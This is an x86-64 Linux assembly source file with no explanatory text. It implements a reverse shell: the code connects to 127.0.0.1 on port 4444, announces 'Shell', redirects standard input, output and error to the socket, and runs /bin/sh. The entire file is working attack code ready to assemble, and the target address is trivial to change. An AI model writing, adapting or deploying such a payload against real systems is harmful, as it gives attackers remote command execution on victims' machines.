BITS 64

global _socket

section .bss
    input resb 256

    struc _socket_struct
        sin_family: resw 1
        sin_port: resw 1
        sin_addr: resd 1
    endstruc


section .rodata

    msg db "Shell"
    msg_len equ $-msg
    error db `Error Socket.`, 10, 0
    error_len equ $-error
    error2 db `Error Connection`, 10, 0
    error2_len equ $-error2
    shell db "/bin/sh", 0

    _struct_socket:
    istruc _socket_struct
        at sin_family, dw 0x2 
        at sin_port, dw 0x5c11
        at sin_addr, dd 0x100007f
    iend

section .text

_socket:
    mov rax, 0x29
    mov rdi, 0x2
    mov rsi, 0x1
    mov rdx, 0x6
    syscall 
    cmp rax, 3
    jne _err_socket
    jmp _connect


_err_socket:
    mov rax, 0x1
    mov rdi, 0x1
    mov rsi, error
    mov rdx, error_len
    syscall
    jmp _exit


_connect:
    mov rax, 0x2A 
    mov rdi, 0x3
    mov rsi, _struct_socket
    mov rdx, 0x10
    syscall 
    cmp rax, 0xffffffffffffff91
    je _error_cn
    jmp _write

_error_cn:
    mov rax, 0x1
    mov rdi, 0x1
    mov rsi, error2
    mov rdx, error2_len
    syscall 
    jmp _exit

_write:
    mov rax, 0x1
    mov rdi, 0x3
    mov rsi, msg
    mov rdx, msg_len
    syscall 
    jmp _dupfile

_dupfile:
    mov rax, 33         
    mov rdi, 0x3       
    mov rsi, 0x0       
    xor rdx, rdx       
    syscall
    mov rax, 33         
    mov rdi, 0x3        
    mov rsi, 0x1        
    xor rdx, rdx
    syscall
    mov rax, 33
    mov rdi, 0x3
    mov rsi, 0x2
    xor rdx, rdx
    syscall
    jmp _shell

_shell: 
    mov rax, 59
    mov rdi, shell
    xor rsi, rsi
    xor rdx, rdx
    syscall
    jmp _exit

_exit:
    mov rax, 0x3C
    mov rdi, 0x0
    syscall